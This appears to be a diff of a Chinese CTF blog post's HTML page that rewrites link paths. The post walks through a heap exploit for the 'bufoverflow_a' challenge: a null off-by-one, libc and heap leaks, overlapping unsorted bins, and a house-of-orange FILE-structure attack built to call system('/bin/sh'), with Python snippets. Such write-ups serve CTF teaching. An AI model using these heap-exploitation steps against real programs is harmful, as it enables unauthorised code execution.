@@ -5,43 +5,43 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，我们检查一下程序的保护机制   然后，我们用IDA分析一下，是一个经典的增删改查的程序，然后我们看到创建堆时，[前两个堆是用malloc创建，后面的堆用calloc创建]{.mark}，这意味着，如果要泄露libc地址，只能靠前两个堆，后面的堆从bin里取出后会清空里面的信息。   Fill功能存在一个**[null off by one漏洞]{.mark}**">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bufoverflow_a">
-<meta property="og:url" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/index.html">
+<meta property="og:url" content="https://github.com/2020/02/19/bufoverflow_a/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，我们检查一下程序的保护机制   然后，我们用IDA分析一下，是一个经典的增删改查的程序，然后我们看到创建堆时，[前两个堆是用malloc创建，后面的堆用calloc创建]{.mark}，这意味着，如果要泄露libc地址，只能靠前两个堆，后面的堆从bin里取出后会清空里面的信息。   Fill功能存在一个**[null off by one漏洞]{.mark}**">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image5.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image6.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/6.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/7.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image7.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image8.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image1.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image2.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image3.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image4.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image5.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image6.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/1.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/2.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/3.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/4.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/5.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/6.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/7.png">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image7.JPG">
+<meta property="og:image" content="https://github.com/2020/02/19/bufoverflow_a/image8.JPG">
 <meta property="article:published_time" content="2020-02-19T04:37:50.000Z">
 <meta property="article:modified_time" content="2025-06-21T12:47:51.617Z">
 <meta property="article:author" content="ha1vk">
@@ -50,9 +50,9 @@
 <meta property="article:tag" content="off by one">
 <meta property="article:tag" content="IO FILE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/02/19/bufoverflow_a/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2020/02/19/bufoverflow_a/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/02/19/bufoverflow_a/">
+<link rel="canonical" href="https://github.com/2020/02/19/bufoverflow_a/">
 
 
 <script id="page-configurations">
@@ -114,7 +114,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -135,27 +135,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -213,10 +213,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/02/19/bufoverflow_a/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/02/19/bufoverflow_a/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -251,7 +251,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -274,51 +274,51 @@
 
       
         <p>首先，我们检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image1.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image1.JPG" class="">
 
 <p>然后，我们用IDA分析一下，是一个经典的增删改查的程序，然后我们看到创建堆时，<strong>[前两个堆是用malloc创建，后面的堆用calloc创建]{.mark}</strong>，这意味着，如果要泄露libc地址，只能靠前两个堆，后面的堆从bin里取出后会清空里面的信息。</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image2.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image2.JPG" class="">
 
 <p>Fill功能存在一个**[null off by one漏洞]{.mark}**</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image3.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image3.JPG" class="">
 
 <p>我们每次只能对最后创建的那个堆进行读写操作</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image4.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image4.JPG" class="">
 
 <p>并且delete以后，指针将清空，就无法进行读写操作，除非重新创建一个堆。</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image5.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image5.JPG" class="">
 
 <p>首先是泄露libc地址，这个很容易，创建一个unsorted bin范围的堆，然后**[后面再创建一个堆用来隔离]{.mark}**，释放后再申请回来显示，即可泄露。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0  </span></span><br><span class="line">create(<span class="number">0x80</span>)  </span><br><span class="line"><span class="comment">#1  </span></span><br><span class="line">create(<span class="number">0x80</span>)  </span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#0申请回来，此时保留了libc指针  </span></span><br><span class="line">create(<span class="number">0x80</span>)  </span><br><span class="line">show()  </span><br></pre></td></tr></table></figure>
 
 <p>接下来，我们要泄露堆地址，我们创建large bin范围的堆释放后申请一个比它还大的堆，使得它被放入large bin，从而堆上保留了堆指针，再申请回来。但是**[堆地址保存在fd_nextsize处，位于chunk_addr + 0x10处，我们如果直接显示，只能显示出fd的内容]{.mark}<strong>，因为后面有’x00’结束了。并且，我们也不能利用fill来填充到fd_nextsize处，因为</strong>[用fill，内容的最后会添加一个’x00’]{.mark}**</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image6.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image6.JPG" class="">
 
 <p>这样，我们仍然不能显示出fd_nextsize的内容。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1  </span></span><br><span class="line">create(<span class="number">0x400</span>) <span class="comment">#large bin范围的堆释放后会有堆地址  </span></span><br><span class="line">create(<span class="number">0x80</span>) <span class="comment">#2  </span></span><br><span class="line"><span class="comment">#将1放入unsorted bin  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#触发整理unsorted bin，将1放入large bin，从而1里堆有指针  </span></span><br><span class="line">create(<span class="number">0x500</span>) <span class="comment">#1  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br></pre></td></tr></table></figure>
 
 <p>目前，堆的布局是这样的</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/1.png" class="" title="1.png">
+<img src="/2020/02/19/bufoverflow_a/1.png" class="" title="1.png">
 
 <p>在chunk1的数据域+0x10处，有堆指针。我们可以**[先释放chunk2，使得chunk1和2合并到top chunk]{.mark}<strong>，这样，堆布局变成了这样，但是</strong>[里面的信息仍然没有清空。]{.mark}**</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/2.png" class="" title="2.png">
+<img src="/2020/02/19/bufoverflow_a/2.png" class="" title="2.png">
 
 <p>然后，我们继续释放chunk0，此时堆布局就只剩下一个TOP chunk</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/3.png" class="" title="3.png">
+<img src="/2020/02/19/bufoverflow_a/3.png" class="" title="3.png">
 
 <p>接下来，<strong>[我们申请一个0xA0大小的堆(数据域大小0x90)。因为bin里面没有合适的chunk，就从TOP chunk里划分]{.mark}</strong>，堆布局变成这样</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/4.png" class="" title="4.png">
+<img src="/2020/02/19/bufoverflow_a/4.png" class="" title="4.png">
 
 <p>然后，我们继续申请一个堆，大小任意，比如0x90</p>
 <p>此时堆布局变成这样</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/5.png" class="" title="5.png">
+<img src="/2020/02/19/bufoverflow_a/5.png" class="" title="5.png">
 
 <p>由于chunk0大小为0xA0，比原先大了0x10，那么chunk1就会向后偏移0x10，也就是**[原来chunk1的fd_nextsize位置是现在chunk1的fd位置]{.mark}**，这样，我们显示，就能泄露出堆地址了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#释放堆2,由于堆2下面是top块，堆2上面的堆1也是free状态，那么就和全部合并到top块里，但里面的指针信息仍然有保留。  </span></span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line"><span class="comment">#此时，堆0下面的堆1是top块，释放0后，堆0也合并到了top块里。  </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#所有bin都合并了，只剩下一个top块  </span></span><br><span class="line"><span class="comment">#错位0x10,使得接下来1的fd位置正好有堆指针  </span></span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment">#0  </span></span><br><span class="line">create(<span class="number">0x80</span>) <span class="comment">#1  </span></span><br><span class="line">show()  </span><br><span class="line">sh.recv(<span class="number">1</span>)  </span><br><span class="line">heap_base = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0xB0</span>  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base=&#x27;</span>,<span class="built_in">hex</span>(heap_base)  </span><br><span class="line"><span class="comment">#============================================  </span></span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line">delete(<span class="number">1</span>)  </span><br></pre></td></tr></table></figure>
 
 <p>我们泄露完信息后，又重新把0和1给释放了，使得他们重新合并到top chunk里。因为我们不需要再用它们了。<strong>[并且由于只有前两个堆使用malloc分配，后面的用calloc分配，为了后续利用，我们要腾出位置。]{.mark}</strong></p>
 <p>接下来，我们就要伪造堆了。我们最终的目的是要构造出这样的堆布局</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/6.png" class="" title="6.png">
+<img src="/2020/02/19/bufoverflow_a/6.png" class="" title="6.png">
 
 <p>这样，我们就能从unsorted bin1里申请合适的堆，控制unsorted bin2，从而利用house of orange来getshell。</p>
 <p>那么，我们就先来伪造chunk</p>
@@ -335,14 +335,14 @@
 <p>还有就是，<strong>[我们的chunk2，包括头结构的总大小为0x100，不能再多也不能再少。]{.mark}</strong></p>
 <p>因为null off by one，可以将下一个chunk的size低一字节覆盖为0，因此，size必须大于1字节。但是如果size大于0x100，这意味着，覆盖以后，这个chunk变小了，我们还需在这个chunk的末尾伪造一个填充chunk。这样会使得待会利用时,由于有填充chunk把它与top chunk隔离，使得它不与top chunk合并。<strong>[而我们的目的是要把fake_chunk合并到top chunk里，这样我们就能构造出包含的unsorted bin。]{.mark}</strong></p>
 <p>经过这样的操作，我们的堆布局变成这样</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/7.png" class="" title="7.png">
+<img src="/2020/02/19/bufoverflow_a/7.png" class="" title="7.png">
 
 <p>着色区域全都在top chunk里面，现在，我们就可以来构造两个包含的unsorted bin。</p>
 <p>我们先来构造0和1构成的unsorted bin，为了能够顺利delete掉0和1，我们需要复原1和2的头结构相关信息。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####注意</span></span><br><span class="line">create(<span class="number">0x290</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#重新复原1、2堆的头信息  </span></span><br><span class="line">fill(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1D0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + <span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line"><span class="comment">#为了delete后我们的内容不被清空或填充，</span></span><br><span class="line"><span class="comment">#我们需要把chunk1也给剔除，这样我们后面申请的时候，才不会被mallocopt设置free后的填充物</span></span><br><span class="line"><span class="comment">#注意顺序！！！</span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">delete(<span class="number">0</span>)  </span><br></pre></td></tr></table></figure>
 
 <p>由于top chunk在fake_chunk处，因此，我们申请时，从top chunk里切割就是从fake_chunk处开始切割。这样，我们就得到了最外层的unsorted bin。</p>
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image7.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image7.JPG" class="">
 
 <p>然后，我们要开始构造内层的unsorted bin，那么我们需要释放fake_chunk。而fake_chunk此时位于index 2。<strong>[接下来，我们申请堆，肯定会从我们辛苦得到的外层unsorted bin里切割，没关系，待会用完重新释放回去。]{.mark}<strong>在程序中的堆指针数组中下标2的地方保存着fake_chunk的地址，</strong>[我们现在的目的是要成功释放fake_chunk2。但是，fake_chunk前后的chunk头信息已经被打乱，我们不能直接释放。]{.mark}</strong></p>
 <p>我们可以从外层unsorted bin里申请一个大点的堆，然后，我们要在这个堆里重新伪造fake_chunk，已经一个填充chunk，由于绕过检查。<strong>[也就是说，我们要在原来的fake_chunk里面末尾腾出一点位置，制造一个填充chunk，就可以绕过检查了。]{.mark}</strong></p>
@@ -361,7 +361,7 @@
 <p>我们把vtable指向__IO_str_jumps，把fp-&gt;_free_buffer指向system函数，把fp-&gt;_IO_buf_base指向&#x2F;bin&#x2F;sh字符串，再伪造其他字段，绕过检查，这样就能触发调用system(“&#x2F;bin&#x2F;sh”)了。同理_IO_str_overflow类似。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#house of orange in 2.24  </span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x60</span>)  </span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#_IO_write_end 、IO_buf_base  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)  </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line"><span class="comment">#vtable指针,同时，也作为fake_vtable的__dummy  </span></span><br><span class="line">fake_file += p64(_IO_str_jumps_addr - <span class="number">8</span>)  </span><br><span class="line"><span class="comment">#__dummy2、__finish  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(system_addr)  </span><br></pre></td></tr></table></figure>
 
-<img src="/ha1vk/2020/02/19/bufoverflow_a/image8.JPG" class="">
+<img src="/2020/02/19/bufoverflow_a/image8.JPG" class="">
 
 <p>如果没有getshell，是由于栈环境问题，多试几次就行了。</p>
 <p>综上，我们的exp脚本</p>
@@ -374,10 +374,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
-              <a href="/ha1vk/tags/house-of-orange/" rel="tag"># house of orange</a>
-              <a href="/ha1vk/tags/off-by-one/" rel="tag"># off by one</a>
-              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
+              <a href="/tags/unsorted-bin/" rel="tag"># unsorted bin</a>
+              <a href="/tags/house-of-orange/" rel="tag"># house of orange</a>
+              <a href="/tags/off-by-one/" rel="tag"># off by one</a>
+              <a href="/tags/IO-FILE/" rel="tag"># IO FILE</a>
           </div>
 
         
@@ -386,11 +386,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/17/waterdrop/" rel="prev" title="Waterdrop">
+    <a href="/2020/02/17/waterdrop/" rel="prev" title="Waterdrop">
       <i class="fa fa-chevron-left"></i> Waterdrop
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/02/19/bufoverflow_b/" rel="next" title="bufoverflow_b">
+    <a href="/2020/02/19/bufoverflow_b/" rel="next" title="bufoverflow_b">
       bufoverflow_b <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -462,20 +462,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -548,30 +548,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
